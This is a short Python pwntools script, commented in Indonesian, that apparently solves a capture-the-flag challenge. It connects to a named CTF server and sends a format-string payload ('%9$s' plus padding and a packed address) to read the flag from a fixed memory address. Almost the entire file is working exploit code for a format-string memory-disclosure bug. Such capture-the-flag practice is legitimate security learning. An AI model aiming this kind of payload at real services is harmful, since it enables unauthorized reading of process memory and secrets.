from pwn import *

# Konfigurasi Target
host = 'gzcli.ctf.cyberjawara.id'
port = 33582
flag_addr = 0x4040a0 #

def solve():
    try:
        io = remote(host, port)
        
        # Penjelasan Payload:
        # %9$s membaca string dari alamat yang ada di offset 9 pada stack.
        # 'A'*4 sebagai padding agar alamat p64(flag_addr) jatuh tepat di offset 9.
        payload = b"%9$s" + b"A"*4 + p64(flag_addr)
        
        io.sendlineafter(b"Input: ", payload)
        
        # Menerima response
        print("[*] Mengambil flag...")
        response = io.recvall(timeout=2)
        print("\nOutput Server:")
        print(response.decode(errors='ignore'))
        
        io.close()
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    solve()
